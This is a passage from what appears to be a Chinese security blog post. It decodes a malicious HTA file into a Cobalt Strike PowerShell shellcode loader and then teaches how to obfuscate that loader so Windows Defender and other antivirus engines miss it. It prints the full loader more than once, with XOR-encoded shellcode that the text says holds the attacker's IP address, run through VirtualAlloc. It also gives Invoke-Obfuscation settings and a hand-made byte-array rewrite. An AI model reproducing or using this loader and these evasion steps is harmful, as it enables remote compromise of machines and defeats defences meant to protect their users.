hp1wOFgpvpmdkMOeKomeGr00vbMaIHdXTyx6m3dFMC2SQ4JeYoeOyM2E/rIraepV5e1rXbo4YCNp52bEKVy0LPpSlqzTLfTm1ude4Ud/TPNYUrAttMeNbtg25N1HXKBGip9ApluZIOtu3Cn2fo2vdliwUh0Op33Z7Y+WYmdV8k1bCxY07VgNOhhNpUF417eDK2Z6D9NLeIiV7LxoJGQWofNa53DPGnYqynZkUlwIJ74SGrzhCQNB7n3rmiRUG5FHe0wj0RPb2nCfDB0lMfZy7A1GuO5WGvok6egP6pqumpVR2LCxJHSGA0c0h083bdaohHjVuCKB99QDlaTQD6G1cPTk2gwkujj5lCbiQIZmi8ks5fbkC1jP5uoh1V7mMw9Je6a//+4ZrXOK5XIb1hwbtUN7mGh2lVbkgX2qVSb72atzqHpScLMvfZmnuo13Q4jteAaeWoNiw1hDmtNd7xb1WayVIs0lLxsVTeRcTLfzjyjrgr3r3QaTdSEva4H/tOsJXZV4PfcDayZpzziNrFXE2LjCX6EPQTkjXd4Ok+aHnFxGz/OJ8F+bmltlGxC+Z94AM+rDSQR4Kk5MXraK/C5Gm21mr4lCrvdCM0W8DBxgS/AI/uT10l2EfA01ZtaamRcPTAUSjlXr9fOTh7Y9e5qO47mt3U97grsFSsS5G+T52ukJlVTkQaZra2WPDxkFWnth9BjHLJ7+3cO/q8cxr3VHKg0UMSy+U+f+Ozuf1tZXB6W517t7f1qdQBrQiOrX/nKHr2rWj9rgHQURhvkQDWDJuZ8Bal+qJ5akb5vZxql0sfd8wsNPepAZwm957lwi47j46x5+kkXA63cscFawgX1BEOh9uGI594EoWM6xrSK1+u8wThFeO6zzoKfP88hvPI7EHvUs9imzFUPQrVazf7rVb7w67DIfpCW3syVswbrnSfvd3LynfgT+mHsufR/mIDvNv3P0Gbg5T3aG3S5Qx/jxReKXwoFbc29m4/sV/gCoTvuLudeBFRnV1t/BZ8r+f1bukQ8pylT7hJx37grCE+MhBp8s4RWnF3G3PET7CuXIPuo+JUbUkyhhb7q+CtgKYWeKjOdG8mEYe4vVWmLI9MNAAA=&#x27;</span>)</span><br><span class="line"><span class="variable">$ms</span> = <span class="built_in">New-Object</span> System.IO.MemoryStream</span><br><span class="line"><span class="variable">$ms</span>.Write(<span class="variable">$data</span>, <span class="number">0</span>, <span class="variable">$data</span>.Length)</span><br><span class="line"><span class="variable">$ms</span>.Seek(<span class="number">0</span>,<span class="number">0</span>) | <span class="built_in">Out-Null</span></span><br><span class="line"><span class="variable">$sr</span> = <span class="built_in">New-Object</span> System.IO.StreamReader(<span class="built_in">New-Object</span> System.IO.Compression.GZipStream(<span class="variable">$ms</span>, [<span class="type">System.IO.Compression.CompressionMode</span>]::Decompress))</span><br><span class="line"><span class="variable">$sr</span>.ReadToEnd() | <span class="built_in">set-clipboard</span></span><br></pre></td></tr></table></figure><p>该脚本首先经过base64解码，然后再进行gzip解压，来得到我们想要看到的hta的源码</p><blockquote><p>这里我犯了一个低级错误，在之前base64解码出来的结果里面，把多余的<code>.</code>都替换掉了，同时也将代码中原本的<code>.</code>也去掉了，故正确的代码应该长这样<br>当时也想到这个问题了，不知道为啥没有注意，挺怪的</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span>=<span class="built_in">New-Object</span> IO.MemoryStream(,[<span class="type">Convert</span>]::FromBase64String(<span class="string">&quot;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&quot;</span>));<span class="built_in">IEX</span> (<span class="built_in">New-Object</span> IO.StreamReader(<span class="built_in">New-Object</span> IO.Compression.GzipStream(<span class="variable">$s</span>,[<span class="type">IO.Compression.CompressionMode</span>]::Decompress))).ReadToEnd();</span><br></pre></td></tr></table></figure><p>结果会自动保存在剪贴板里<br>得到解压后的源码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$DoIt</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">function func_get_proc_address &#123;</span></span><br><span class="line"><span class="string">Param ($var_module, $var_procedure)</span></span><br><span class="line"><span class="string">$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span></span><br><span class="line"><span class="string">$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span></span><br><span class="line"><span class="string">return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function func_get_delegate_type &#123;</span></span><br><span class="line"><span class="string">Param (</span></span><br><span class="line"><span class="string">[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span></span><br><span class="line"><span class="string">[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span></span><br><span class="line"><span class="string">$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string">$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">return $var_type_builder.CreateType()</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckuAPCMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMeXZPYiMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxoNExgDdEpNR0xUUANtdwMVDRIYA3dRSkdGTVcMFg0TCgNvYWFxbHRwZnEuKSMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnB3DmVqb2YCB2sIawkjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBmNic3gXfyNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEBoNEhMVDRITFw0SEBQjIyMjIw==&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span></span><br><span class="line"><span class="string">$var_code[$x] = $var_code[$x] -bxor 35</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span></span><br><span class="line"><span class="string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span></span><br><span class="line"><span class="string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span></span><br><span class="line"><span class="string">$var_runme.Invoke([IntPtr]::Zero)</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line"><span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$DoIt</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">IEX</span> <span class="variable">$DoIt</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分别用Windows Defender测试每一段代码，发现在<code>$var_code</code>中报毒<br>进一步对<code>$var_code</code>解码（我本地base64解出来都是乱码，挺怪的）<br>看别人的结果说能得到一串ASCII字符，而ASCII解码后得到一堆乱码，但在最后，可以发现攻击者的IP，也没什么其他可以获取的信息了</p><blockquote><p>总的来说  powershell的上线方式就是通过VirtualAlloc分配内存然后执行CS的shellcode,shellcode存放在了$var_code变量中</p></blockquote><h2 id="powershell免杀"><a href="#powershell免杀" class="headerlink" title="powershell免杀"></a>powershell免杀</h2><h3 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h3><p>通过对上面hta文件的分析之后，我们知道Windows Defender是对<code>$var_code</code>进行了检测报毒，那我们需要做的就是将该部分进行混淆处理，来绕过Windows Defender的检测<br>这里先推荐一个开源的混淆工具<a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> ./<span class="built_in">Invoke-Obfuscation</span>.psd1</span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span></span><br></pre></td></tr></table></figure><p>根据其步骤安装，运行</p><p><img src="https://s2.loli.net/2022/08/16/4myYitWBsOSNvoJ.png" alt="好酷炫的界面"></p><p>因为没有仔细去研究该工具的使用方法，就直接用的其他大佬的配置<br><code>Set scriptblock &#39;final_base64payload&#39;</code> <code>COMPRESS</code> <code>1</code>,该配置可以绕过Windows Defender，（也可以选择其他混淆方式来绕过不同的防火墙）该工具会根据该配置输出可以绕过Windows Defender的PowerShell命令<br><img src="https://s2.loli.net/2022/08/16/gSbkTOpM3fj1UCV.png"></p><p><code>Out d:payload.ps1</code>将其输出<br><img src="https://s2.loli.net/2022/08/16/CyxmieSZpvrMLEc.png" alt="得到payload.ps1"><br>将其新建的有效载荷替换掉$var_code中的内容，Windows Defender成功绕过</p><p>接着我们把他丢到<a href="https://www.virustotal.com/gui/file/1a2e0851bbae380c43881d70f41835b4a22e74ae2c2daf45593ffb764fc6e9e9?nocache=1">virustotal</a>上看看效果</p><p><img src="https://s2.loli.net/2022/08/16/yg2twhGMiqX6HuQ.png"></p><p><img src="https://s2.loli.net/2022/08/16/EC8iXIbahkVWGSm.png"><br>虽然可以绕过一些大厂的防火墙，例如：微软，腾讯，McAfee<br>但是16/59 感觉还是不太行那我们接下来试试手动免杀</p><h3 id="人工免杀"><a href="#人工免杀" class="headerlink" title="人工免杀"></a>人工免杀</h3><p>我们直接用CS生成一个powershell的payload，不然用之前hta中包含的话，几层base64又压缩啥的太麻烦了<br>先来看看源码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$DoIt</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">function func_get_proc_address &#123;</span></span><br><span class="line"><span class="string">Param ($var_module, $var_procedure)</span></span><br><span class="line"><span class="string">$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span></span><br><span class="line"><span class="string">$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span></span><br><span class="line"><span class="string">return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function func_get_delegate_type &#123;</span></span><br><span class="line"><span class="string">Param (</span></span><br><span class="line"><span class="string">[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span></span><br><span class="line"><span class="string">[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span></span><br><span class="line"><span class="string">$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string">$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">return $var_type_builder.CreateType()</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSBycktTjiMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMV0saZCMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxoNExgDdEpNR0xUUANtdwMVDRIYA3RsdBUXGAN3UUpHRk1XDBYNExgDbmJwYQouKSMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnB3DmVqb2YCB2sIawkjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBmNicyNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhMSDRIQEQ0RERQNEREUIyMjIyM=&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span></span><br><span class="line"><span class="string">$var_code[$x] = $var_code[$x] -bxor 35</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span></span><br><span class="line"><span class="string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span></span><br><span class="line"><span class="string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span></span><br><span class="line"><span class="string">$var_runme.Invoke([IntPtr]::Zero)</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line"><span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$DoIt</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">IEX</span> <span class="variable">$DoIt</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>与之前的一样，我们需要添加混淆的还是<code>$var_code</code><br>思路是将base64编码换掉，因为base64编码会被杀掉，改成byte数组<br><img src="https://s2.loli.net/2022/08/16/uT4nE71YSL5rpxf.png"></p><p>这可能就是传说中的FromBase65String？<br>将<code>$var_code</code>改掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Byte[]]$var_code &#x3D; [Byte[]](223,203,170,35,35,35,67,170,198,18,241,71,168,113,19,168,113,47,168,113,55,168,81,11,44,148,105,5,18,220,18,227,143,31,66,95,33,15,3,226,236,46,34,228,193,211,113,116,168,113,51,168,97,31,34,243,168,99,91,166,227,87,105,34,243,115,168,107,59,168,123,3,34,240,192,31,106,168,23,168,34,245,18,220,18,227,143,226,236,46,34,228,27,195,86,215,32,94,219,24,94,7,86,193,123,168,123,7,34,240,69,168,47,104,168,123,63,34,240,168,39,168,34,243,170,103,7,7,120,120,66,122,121,114,220,195,123,124,121,168,49,200,165,126,75,77,70,87,35,75,84,74,77,74,119,75,111,84,5,36,220,246,18,220,116,116,116,116,116,75,25,117,90,132,220,246,202,167,35,35,35,120,18,234,114,114,73,32,114,114,75,83,142,35,35,112,115,75,116,170,188,229,220,246,200,83,120,18,241,113,75,35,33,99,167,113,113,113,112,113,115,75,200,118,13,24,220,246,170,229,160,224,115,18,220,116,116,73,220,112,117,75,14,37,59,88,220,246,166,227,44,167,224,34,35,35,18,220,166,213,87,39,170,218,200,42,75,137,230,193,126,220,246,170,226,75,102,2,125,18,220,246,18,220,116,73,36,114,117,115,75,148,116,195,40,220,246,156,35,12,35,35,26,228,87,148,18,220,202,178,34,35,35,202,234,34,35,35,203,168,220,220,220,12,87,75,26,100,35,22,108,2,115,6,99,98,115,120,23,127,115,121,123,22,23,11,115,125,10,20,96,96,10,20,94,7,102,106,96,98,113,14,112,119,98,109,103,98,113,103,14,98,109,119,106,117,106,113,118,112,14,119,102,112,119,14,101,106,111,102,2,7,107,8,107,9,35,22,108,2,115,6,35,118,80,70,81,14,98,68,70,77,87,25,3,110,76,89,74,79,79,66,12,22,13,19,3,11,64,76,78,83,66,87,74,65,79,70,24,3,110,112,106,102,3,26,13,19,24,3,116,74,77,71,76,84,80,3,109,119,3,21,13,18,24,3,116,108,116,21,23,24,3,119,81,74,71,70,77,87,12,22,13,19,24,3,110,98,112,97,10,46,41,35,22,108,2,115,6,99,98,115,120,23,127,115,121,123,22,23,11,115,125,10,20,96,96,10,20,94,7,102,106,96,98,113,14,112,119,98,109,103,98,113,103,14,98,109,119,106,117,106,113,118,112,14,119,102,112,119,14,101,106,111,102,2,7,107,8,107,9,35,22,108,2,115,6,99,98,115,120,23,127,115,121,123,22,23,11,115,125,10,20,96,96,10,20,94,7,102,106,96,98,113,14,112,119,98,109,103,98,113,103,14,98,109,119,106,117,106,113,118,112,14,119,102,112,119,14,101,106,111,102,2,7,107,8,107,9,35,22,108,2,115,6,99,98,115,120,23,127,115,121,123,22,23,11,115,125,10,